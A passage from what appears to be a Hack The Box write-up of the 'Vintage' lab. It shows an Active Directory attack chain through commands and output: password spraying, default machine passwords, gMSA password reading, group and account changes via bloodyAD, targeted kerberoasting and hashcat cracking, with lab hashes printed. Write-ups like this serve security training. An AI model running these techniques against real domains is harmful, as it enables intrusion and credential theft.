SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi_adm:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri_adm:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ark:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ldap:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\G.Viola:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\R.Verdi:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\M.Rossi:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\Administrator:Rosaisbest123 KDC_ERR_PREAUTH_FAILED
```

Spraying username as password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb --log nxc_kerberos.log -k $(pt get dc_fqdn) --continue-on-success --no-bruteforce -u ldeep/_users_enabled.lst -p ldeep/_users_enabled.lst
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi_adm:L.Bianchi_adm KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri_adm:C.Neri_adm KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ark:svc_ark KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ldap:svc_ldap KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\P.Rosa:P.Rosa KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri:C.Neri KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\G.Viola:G.Viola KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi:L.Bianchi KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\R.Verdi:R.Verdi KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\M.Rossi:M.Rossi KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\Administrator:Administrator KDC_ERR_PREAUTH_FAILED
```

> We noticed that `P.Rosa`'s password format is its name ending with `isbest123`, so we applied the format to every usernames then spray the password
{: .prompt-info }

Extract all usernames after `.` symbol then add `isbest123` at the end of each lines

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/_users_enabled.lst | awk -F'.' '{print $NF}' > names.txt

┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ sed 's/$/isbest123/' names.txt > pass_custom.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb --log nxc_kerberos.log -k $(pt get dc_fqdn) --continue-on-success --no-bruteforce -u ldeep/_users_enabled.lst -p pass_custom.txt
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi_adm:Bianchi_admisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri_adm:Neri_admisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ark:svc_arkisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\svc_ldap:svc_ldapisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\C.Neri:Neriisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\G.Viola:Violaisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\L.Bianchi:Bianchiisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\R.Verdi:Verdiisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\M.Rossi:Rossiisbest123 KDC_ERR_PREAUTH_FAILED
SMB         DC01.vintage.htb 445    DC01             [-] vintage.htb\Administrator:Administratorisbest123 KDC_ERR_PREAUTH_FAILED
```


### Pre-Windows 2000 computers - Default password

We noticed that there's an insecure group : [Pre-Windows 2000 Compatible Access](https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/) that contains all `AUTHENTICATED USERS`

![](/assets/obsidian/5d52161e300bea249cb78dd0e7d26792.png)

> Usually machine accounts have a strong password generated automatically and changes every 30 days. However, when a computer is configured with `Pre-Windows 2000 Compatible Access` group, it will have its password set based on its lowercase name without the trailing `$`
{: .prompt-warning }

> Ref - https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers

Get all machine accounts in the `Pre-Windows 2000 Compatible Access` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/_machines.json | jq '.[] | select(.memberOf != null) | select(.memberOf[] | startswith("CN=Pre-Windows 2000 Compatible Access")) | .sAMAccountName' -r | tee machines_pw2000ca.lst
FS01$
```

Create password list

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat machines_pw2000ca.lst | tr '[:upper:]' '[:lower:]' | sed 's/.$//' | tee machines_pw2000ca_pass.lst
fs01
```

While spraying with the wordlists, we discovered that `FS01$` has default password set

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc ldap --log nxc_kerberos.log -k $(pt get dc_fqdn) --no-bruteforce --continue-on-success -u machines_pw2000ca.lst -p machines_pw2000ca_pass.lst
LDAP        DC01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        DC01.vintage.htb 389    DC01             [+] vintage.htb\FS01$:fs01
```


## Auth as gMSA01$


### DACL Abuse - Read GMSA password

Read **GMSA (Group Managed Service Accounts)** password from `gMSA01$`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" ldeep ldap -k -d $(pt get domain) -s ldap://$(pt get domain) gmsa
gMSA01$:nthash:51434c5b357ff89c5f85d994a27f7339
gMSA01$:aes128-cts-hmac-sha1-96:c07559ad23ecd44261123eb1ad1f3d0b
gMSA01$:aes256-cts-hmac-sha1-96:1bde0ea4f2f91b93e8c221814de5f77fc05181806bdda163efb062637384397c
gMSA01$:reader:Domain Computers (group)
```

Validated the credential

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ nxc smb -k $(pt get rhost) -u 'gMSA01$' -H '51434c5b357ff89c5f85d994a27f7339'
SMB         DC01.vintage.htb 445    DC01             [*]  x64 (name:DC01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         DC01.vintage.htb 445    DC01             [+] vintage.htb\gMSA01$:51434c5b357ff89c5f85d994a27f7339
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ pt set user 'gMSA01$'; pt set hash ':51434c5b357ff89c5f85d994a27f7339'; echo "$(pt get user):$(pt get hash)" | anew hashes.lst
gMSA01$::51434c5b357ff89c5f85d994a27f7339
```


## Auth as svc_sql


### Path finding

After setting `GMSA01$@VINTAGE.HTB` as owned, by running the **Shortest Path From Owned Objects** query, we know that we eventually own `svc_ldap`, `svc_ark` and `svc_sql` users

![](/assets/obsidian/e7e3af18bfd1462fbf900a73c7ce80d0.png)


### DACL Abuse - Add a Member to SERVICEMANAGERS

Add `gMSA01$` itself to the `SERVICEMANAGERS` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'gMSA01$' -p '51434c5b357ff89c5f85d994a27f7339' -k -f rc4 add groupMember 'SERVICEMANAGERS' 'gMSA01$'
[+] gMSA01$ added to SERVICEMANAGERS
```


### DACL Abuse - Targeted kerberoast

Since we have `GenericALL` rights to`svc_ldap`, `svc_ark` and `svc_sql` users, there are 3 things to do:

1. Targeted **kerberoast** (Add SPNs on controlled users then remove them after **kerberoasting**)
2. Force change password
3. Create shadow credentials

> Since **ADCS** is not enabled, we can only do **targeted kerberoast** and **force change password**. We should do **targeted kerberoasting** first to attempt cracking the hashes of original users' passwords, force change their passwords if hash cracking failed then check what access the users have
{: .prompt-info }

Request a TGT

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ getTGT.py -dc-ip $(pt get ip) "$(pt get domain)"/"$(pt get user)" -hashes "$(pt get hash)"; pt set ticket $(realpath "$(pt get user).ccache")
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in gMSA01$.ccache
```

While running [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast), the script errored out with `Error while anonymous logging into vintage.htb`, because it tries to get the target machine name by using **NTLM** anonymous authentication even if **kerberos** option is enabled

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -v -d "$(pt get domain)" -k
[*] Starting kerberoast attacks
[!] Error while anonymous logging into vintage.htb
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 280, in login
    return self._SMBConnection.login(user, password, domain, lmhash, nthash)
           ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1007, in login
    if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
       ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3structs.py", line 460, in isValidAnswer
    raise smb3.SessionError(self['Status'], self)
impacket.smb3.SessionError: SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/opt/sectools/ad/targetedKerberoast/targetedKerberoast.py", line 32, in get_machine_name
    s.login('', '')
    ~~~~~~~^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 282, in login
    raise SessionError(e.get_error_code(), e.get_error_packet())
impacket.smbconnection.SessionError: SMB SessionError: code: 0xc00000bb - STATUS_NOT_SUPPORTED - The request is not supported.

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/opt/sectools/ad/targetedKerberoast/targetedKerberoast.py", line 527, in main
    ldap_server, ldap_session = init_ldap_session(dc_ip=args.dc_ip, use_kerberos=use_kerb, use_ldaps=args.use_ldaps, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
                                ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/opt/sectools/ad/targetedKerberoast/targetedKerberoast.py", line 233, in init_ldap_session
    target = get_machine_name(dc_ip, domain)
  File "/opt/sectools/ad/targetedKerberoast/targetedKerberoast.py", line 35, in get_machine_name
    raise Exception('Error while anonymous logging into %s' % domain)
Exception: Error while anonymous logging into vintage.htb
```

![](/assets/obsidian/26ddb39b40306327e4d74c378429eee3.png)

We have to specify `dc_host` for it to get the `target` name

![](/assets/obsidian/c409be8383af9a9c811fe6e7cb8a2ce7.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -o targetedroastables.txt -v --dc-host "$(pt get dc_fqdn)" -d "$(pt get domain)" -k --no-pass
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (svc_ldap)
[+] Writing hash to file for (svc_ldap)
[VERBOSE] SPN removed successfully for (svc_ldap)
[VERBOSE] SPN added successfully for (svc_ark)
[+] Writing hash to file for (svc_ark)
[VERBOSE] SPN removed successfully for (svc_ark)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat targetedroastables.txt
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$1aac578321d51ccbd8cdc0c384669bc2$40690508b98a8ad5f983fd909a1945f97fb91de8545c1b3d286ed25af4f23ad5d9e02c1c7b9124e84de94f6fa185ef4103a9281a4b0beb5f776212673b855fa262c1d096a6e61bdb34401568ae391ffea7c024ad02b96aa713227fdd2e03d86299d039732bf4583ba3eb3ca890546c9f1b98d96a328b0f914713f1afd7d0666175409dbd12de726b63154f18d04d9d5ded154fb4fbd0ddc3bd7e034da602e906eeded91a7a9d871aea015c00fe1288f82bd04d8d0be6ed02dc367dc9e0656622d95284f3ef6a251e2e30e15d8fb8593ed4e7e89d787b7db24ff74fd631f83401519eea70ba5682cc1a7f61ad9770bc5bca514797ca669102fdd312172d267f0b2b25b43d0ed5a09e215bd4d62cd05c6e6ed722d7d6c1572e6ac33f6b9721149a4680dac879668f91970df5acfc15e5ec349e28598e1e72b06c6ebee54fc8c70d897efe2e825763665372e38966356b523d65f1d830e34dc589f79e49e17cd8989f540e1fb120efb777562135db8440ab5f056c83fe7963fae6acca4f75245c6585116f8b285d324873cb83bc267fb120eb744897d2839bb24d6e886bdd297ed60ccc00cc284692d3ec4a7480b767e2fe30aeae8c81b2025df916c573a2dfe97f691706198f99e5a1000cfaa60eb123656776f8b1c3082b00292dc281b5baeab3bc5ff376938e54c2b7d3a4d6d86d069fd300ac757c87b27cdf3d1c7984f9c1b567a7dfde3f861ab459914aa60ab082107effed86c05ec71dba77377f76e7d87a78c88cbffef9acde849c0b7a8fa9ae1490c003f778146b2b308ea3df26db57ce16d72f4dd54cd5601ff09a48f8ecc20f3ffbdd5c2678d5426ef8a57ec418ed2fa2f10042a4a265f21a0fa5372a5022e935d8b6e7cb9c38e03eaee92d01a6095a40b60f954e70c267da0079c2b9036478ab529c9ad4bb6bc324c25f6d0a6ee513d1895cfc66e364cda5261ecc51370e03ce146f0daff200729037aa89fbb29dc24289f4a6cfccc09d5974f7b7f58fd0754381d076dcf01fb7c79ca5cbda6a07ed6b327db9f9f4047999feb3b07ce4f9d0b3e6a424632f0c50085e8b50bb7763a1f9eb5f4542edd7a99b0cac549fb4ce57400107719e460d47769492e3253dcec6dcf4cbca0a9ffd7e2c575931af4af02fae550ceb8335f084d11f5a35e1e9121dd202b77732db49678b4874b86b41d1842852b657a9489a2da055c0c5bb71a23c8a95ff611313ecbf5c6bd19f62cd3cc53191fac6b5b9a5ec32b469b60816a104eb42cd8d936bfe4a77e273d35879acb8e8dd672b764ed630531f2745dd8420f6156a7d1aee13fc00120b090c8a9084b0ea89141f15d17e0dcb3de929a3a10d97dd87838911ba904e36ba4a9557027fca49cf776137e80ce3041969d14f057d6b727e156b2c7a80087126f3566498c3d20970dff260bcf7a34fce8d858fb4f7ffba4d28
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$7dae5c3e8ad77599ea93907ce0ce5353$c8ea5e2f3a89110ab53b3b146d97faee53eb4595b476138a9076990aeaa477d118b2955438ef145df141e8406a930424a381c13b604256eecb8434c857856274edd072d148fad084e55b488f2e6080c27d73547e05f27dcdc2d68ee404520e912dd8c93bec9cf0ed9c0e57c3fe1585cae9db9511660601cf3c26580ff8dfe11e8ad651020d8c97ebe316a21d15678e20aeee6c83d03e21fe1ba0dcdef968b9e3db461a998ae8a6e251175dc6b6ae114252bace274dccd9005cc91cb23642be488ebfc646f0fc8cfee65627fbc1d1560183b0fa701b4c1c31debe3b46ea941cf73853134ee9688f9b81c22c7d7a0e8f0aec694e1b2f17b70eaa1ea6376ab85dacae03e24f6abc2f19c1120e747872c9f1fc8833b6173599e5599edac151f45625a26d99be106b1f150d098a1a519d485c1526332e42826f6b51b09243272912a5a6feb6259b2372720faa67abcc552e900883b557d20d68e4053af2d8d29ffaf05b84f894b29fa85f9b176187210893402baba9ac48cbc52d5026731306b12dd6b1cbfea0a192f319acf2b0db5cc43e04391dee33bd3b381297eb2ea5384c1ccfea4b48dbb59a96e20303228ffd73ed59757320a258cd0775aeb7dfcc5b74fe7c9c6bfde05de5448a8950c2da08a0c23211333231c4692805eba5fe766362fd6c2678edb27fb680e0d34bbe18f313b5cb9288eff3cc101a031ca92e6b434a9ba360859260aa9387057539ba4296673b1d1f0c94fda23c1320435f7e0095d36556e9de7cc2e5eb80395fae3d9dcf6bc9c733729ae369158f6dc38d3c1d8a3db12a96357469c853e8911814127682236eef4e4318152b40cb4feae42adcc7c1ffdb0c954f274eceb310726dd0c4189a918cd9a679983b09f80b534fd237ec3be4def47672a61ce3e1117dd96780134c2ccd44c854ff3779ec207e7fc1da7fb06b6ac2681efb438bde77a966b91121306c316463e027cab3818ab7761eaf891a86be192e1fdb07012073185c368fd3de63441ca79144b4cf921ad6a078d01ba349130e274e08927871538ca0147f20f6b4ac800270595737774b8746236052340f24676054f127b72719fc270e205f8ed2e47744f613a6d40373935996d4cd40b7bbcddc58baaf5b5cf061c8bfee15ac1eb548b45281a1a55e4b29f8e55f4494a63b48ee62f0a48f37fe7a91cc446c5ba4b99f95b0df872de2395139d3dc8e83bbce0ca2b0f111a83489b7929b692b9e87841ad87163258f9ae637e7bc7684d8a18e9892e8d14e9686b7b27dc67acc6766d7aed2d7a06aaa49568e77fef2eaaf50c483d8f02033626c50e1c1f4a7d2bc7c5733dea27ee543a53948bc59126608fb141e85fe549cf2ec970b6eb022a98cf021373dbd760735473aec3236a010a4ea683648d2999cb4129b27d221b33272bfcc32f9c13dc5980c4a49f65ed7dca94d3b1033a3
```

No hashes were cracked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ hashcat targetedroastables.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
[...]
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: targetedroastables.txt
[...]
```

We can see that the user `svc_sql` is missing, that's because the account was disabled (`ACCOUNTDISABLE` flag was set in `userAccountControl` attribute)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ cat ldeep/_users_disabled.json | jq '. | map(select(.cn=="svc_sql"))'
[
  {
    "accountExpires": "9999-12-31T23:59:59.999999+00:00",
    "badPasswordTime": "2024-06-07T08:28:03.762669+00:00",
    "badPwdCount": 1,
    "cn": "svc_sql",
    "codePage": 0,
    "countryCode": 0,
    "dSCorePropagationData": [
      "2024-11-13T14:17:43+00:00",
      "2024-06-06T14:15:18+00:00",
      "2024-06-06T14:13:26+00:00",
      "2024-06-06T14:12:13+00:00",
      "1601-01-01T00:00:00+00:00"
    ],
    "distinguishedName": "CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb",
    "dn": "CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb",
    "instanceType": 4,
    "lastLogoff": "1601-01-01T00:00:00+00:00",
    "lastLogon": "1601-01-01T00:00:00+00:00",
    "logonCount": 0,
    "memberOf": [
      "CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb"
    ],
    "msDS-SupportedEncryptionTypes": 0,
    "name": "svc_sql",
    "objectCategory": "CN=Person,CN=Schema,CN=Configuration,DC=vintage,DC=htb",
    "objectClass": [
      "top",
      "person",
      "organizationalPerson",
      "user"
    ],
    "objectGUID": "{3fb41501-6742-4258-bfbe-602c3a8aa543}",
    "objectSid": "S-1-5-21-4024337825-2033394866-2055507597-1134",
    "primaryGroupID": 513,
    "pwdLastSet": "2025-03-20T06:12:03.787132+00:00",
    "sAMAccountName": "svc_sql",
    "sAMAccountType": "SAM_GROUP_OBJECT | SAM_NON_SECURITY_GROUP_OBJECT | SAM_ALIAS_OBJECT | SAM_NON_SECURITY_ALIAS_OBJECT | SAM_USER_OBJECT | SAM_NORMAL_USER_ACCOUNT | SAM_MACHINE_ACCOUNT | SAM_TRUST_ACCOUNT | SAM_ACCOUNT_TYPE_MAX",
    "uSNChanged": 114980,
    "uSNCreated": 20586,
    "userAccountControl": "ACCOUNTDISABLE | NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "whenChanged": "2025-03-20T06:12:03+00:00",
    "whenCreated": "2024-06-06T13:45:27+00:00"
  }
]
```

Enable `svc_sql` by removing `ACCOUNTDISABLE` property flag from `userAccountControl` attribute

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ bloodyAD --host $(pt get rhost) -d $(pt get domain) -u 'gMSA01$' -p '51434c5b357ff89c5f85d994a27f7339' -k -f rc4 remove uac 'svc_sql' -f 'ACCOUNTDISABLE'
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

Start **targeted kerberoasting** on `svc_sql`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ KRB5CCNAME="$(pt get ticket)" python /opt/sectools/ad/targetedKerberoast/targetedKerberoast.py -v --dc-host "$(pt get dc_fqdn)" -d "$(pt get domain)" -k --no-pass --request-user 'svc_sql'
[*] Starting kerberoast attacks
[*] Attacking user (svc_sql)
[VERBOSE] SPN added successfully for (svc_sql)
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$5ec76b7e10f50c3f5d09d619d6971df6$f4d9289c693fe5a9772f92bdd0b96dadfcbc916e6feeb67da9081d65e9a25ecf9ec6a655213a580f4a895840995c0159399adce2fb6ad28a5116f7d9e038a7ae17723d66068091197956cc1a836b0966dc78d603a4764ea08016f4bd8bad713b187212270285776fd8cc18d00c6e4da9c681282f97222cebf8d9effeb41e8ab6461c79931506a7d51b535ffe489137901f220f70d55a720fecbb5c03e7e0a5976f7339bf8c0f8ac62e0ec33676f0e5fa065e88815eed3ea15d0aadc3148b237234b1967e1422b51965590f90df2a78adf23de68206094e486df541f34e7ef7f7b9b5020cc94a39722a253eff1e8fa5e9f6d14af2c110b31cd41a08a9b6b96334bfd40c32344c4e4ee4302336aa6d2ba430ea723a9f262b58c0a3acad654ddd8b9b6016e9918f2d3fe2943efc1b3af047d50affe417a7ab4da7d4c15855bee2bc43f7bde58f1c62fb3bd23229958dc36bf20dada50d61af92736dc4f809e99fac5d73fb00b0e09977f9d0bdd0264f7ada03c4eb204b5b40b557e3d24eea0c3e39df10a4ec00b94abf492e37612502bc26da2d356e93b451365c4e78a308d030a9c7d1ec0d3e98d5ec375fe34d81b57dc4d39ef8e929cafd1911f8e596e9e1b2a1e7782ab75d50df5f1a7826c6dc94581f4b9e61f22a795349080c58016ec2adb9df051673a49baf3633849b58ce38b9e9e2ad8d0d61ef82fc6d877255d2119c202699478c455a05c6feddd17c563faeaa556ca98a440cc0962ab18f6934705b20285e1a142ec85d8a19214a3063383ba2e9065520da14cc96b5901e09a5ebb6df8411cb010a149a2ff38e359511a321b439b838388506c19da866c04e73b23053e722608392a357340433fa1eefa66ad667431929cde7a6908c261c5d37e6b0247ec0e498bf348cbee2ba88566877b12f799ca195eb37d7b6b77ca93547b62212a3e6213520a38b17811754b4eb3d9702ffa63f4d9a08703dd114adeffa827c7fa6ce59709e754c0424d16c5354c1a57c5c84764b7796778f786a79c30f53da3ef798157a447c80af12a592adda25fa73c6ab0cef4a6e77dd4d52c70df09d030ec0a33319569b6ab985a26d251003bda91497dbce8a41f8fd614a6fc685c69890911f7ab029f37a8b2ee0d04c431e7b969f5ab31a2587a7785b5c45fd8430eef3070a0e6f29b9f602cb60b524536415dd877c9830398b86eb484fe18c825aeddd26cd150f65ee8cbfb722611db25c5905c6b412df633bd8db3b2388fba81168eeb261ea1e79afc3fbcbc0513ca9d652c957f14b3416e31cae514723a259ee68b305f5dbed234b15a738968bb470bd232a76323662b1aaab6d82ee69a5db946bc89504e9462961f52856c487cf092c62687d4f385d287d1c044db14085ceb8ca6308f0433b28e33892f3446d9d39ee062e18eeb527fb75131d1785b85bc2109976542a1b
[VERBOSE] SPN removed successfully for (svc_sql)
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$  echo '$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$5ec76b7e10f50c3f5d09d619d6971df6$f4d9289c693fe5a9772f92bdd0b96dadfcbc916e6feeb67da9081d65e9a25ecf9ec6a655213a580f4a895840995c0159399adce2fb6ad28a5116f7d9e038a7ae17723d66068091197956cc1a836b0966dc78d603a4764ea08016f4bd8bad713b187212270285776fd8cc18d00c6e4da9c681282f97222cebf8d9effeb41e8ab6461c79931506a7d51b535ffe489137901f220f70d55a720fecbb5c03e7e0a5976f7339bf8c0f8ac62e0ec33676f0e5fa065e88815eed3ea15d0aadc3148b237234b1967e1422b51965590f90df2a78adf23de68206094e486df541f34e7ef7f7b9b5020cc94a39722a253eff1e8fa5e9f6d14af2c110b31cd41a08a9b6b96334bfd40c32344c4e4ee4302336aa6d2ba430ea723a9f262b58c0a3acad654ddd8b9b6016e9918f2d3fe2943efc1b3af047d50affe417a7ab4da7d4c15855bee2bc43f7bde58f1c62fb3bd23229958dc36bf20dada50d61af92736dc4f809e99fac5d73fb00b0e09977f9d0bdd0264f7ada03c4eb204b5b40b557e3d24eea0c3e39df10a4ec00b94abf492e37612502bc26da2d356e93b451365c4e78a308d030a9c7d1ec0d3e98d5ec375fe34d81b57dc4d39ef8e929cafd1911f8e596e9e1b2a1e7782ab75d50df5f1a7826c6dc94581f4b9e61f22a795349080c58016ec2adb9df051673a49baf3633849b58ce38b9e9e2ad8d0d61ef82fc6d877255d2119c202699478c455a05c6feddd17c563faeaa556ca98a440cc0962ab18f6934705b20285e1a142ec85d8a19214a3063383ba2e9065520da14cc96b5901e09a5ebb6df8411cb010a149a2ff38e359511a321b439b838388506c19da866c04e73b23053e722608392a357340433fa1eefa66ad667431929cde7a6908c261c5d37e6b0247ec0e498bf348cbee2ba88566877b12f799ca195eb37d7b6b77ca93547b62212a3e6213520a38b17811754b4eb3d9702ffa63f4d9a08703dd114adeffa827c7fa6ce59709e754c0424d16c5354c1a57c5c84764b7796778f786a79c30f53da3ef798157a447c80af12a592adda25fa73c6ab0cef4a6e77dd4d52c70df09d030ec0a33319569b6ab985a26d251003bda91497dbce8a41f8fd614a6fc685c69890911f7ab029f37a8b2ee0d04c431e7b969f5ab31a2587a7785b5c45fd8430eef3070a0e6f29b9f602cb60b524536415dd877c9830398b86eb484fe18c825aeddd26cd150f65ee8cbfb722611db25c5905c6b412df633bd8db3b2388fba81168eeb261ea1e79afc3fbcbc0513ca9d652c957f14b3416e31cae514723a259ee68b305f5dbed234b15a738968bb470bd232a76323662b1aaab6d82ee69a5db946bc89504e9462961f52856c487cf092c62687d4f385d287d1c044db14085ceb8ca6308f0433b28e33892f3446d9d39ee062e18eeb527fb75131d1785b85bc2109976542a1b' > targetedroastables-svc_sql.txt
```

The hash of `svc_sql` was cracked

```bash
┌──(bravosec㉿fsociety)-[~/htb/Vintage]
└─$ hashcat targetedroastables-svc_sql.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting in autodetect mode
[...]
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$5ec76b7e10f50c3f5d09d619d6971df6$f4d9289c693fe5a9772f92bdd0b96dadfcbc916e6feeb67da9081d65e9a25ecf9ec6a655213a580f4a895840995c0159399adce2fb6ad28a5116f7d9e038a7ae17723d66068091197956cc1a836b0966dc78d603a4764ea08016f4bd8bad713b187212270285776fd8cc18d00c6e4da9c681282f97222cebf8d9effeb41e8ab6461c79931506a7d51b535ffe489137901f220f70d55a720fecbb5c03e7e0a5976f7339bf8c0f8ac62e0ec33676f0e5fa065e88815eed3ea15d0aadc3148b237234b1967e1422b51965590f90df2a78adf23de68206094e486df541f34e7ef7f7b9b5020cc94a39722a253eff1e8fa5e9f6d14af2c110b31cd41a08a9b6b96334bfd40c32344c4e4ee4302336aa6d2ba430ea723a9f262b58c0a3acad654ddd8b9b6016e9918f2d3fe2943efc1b3af047d50affe417a7ab4da7d4c15855bee2bc43f7bde58f1c62fb3bd23229958dc36bf20dada50d61af92736dc4f809e99fac5d73fb00b0e09977f9d0bdd0264f7ada03c4eb204b5b40b557e3d24eea0c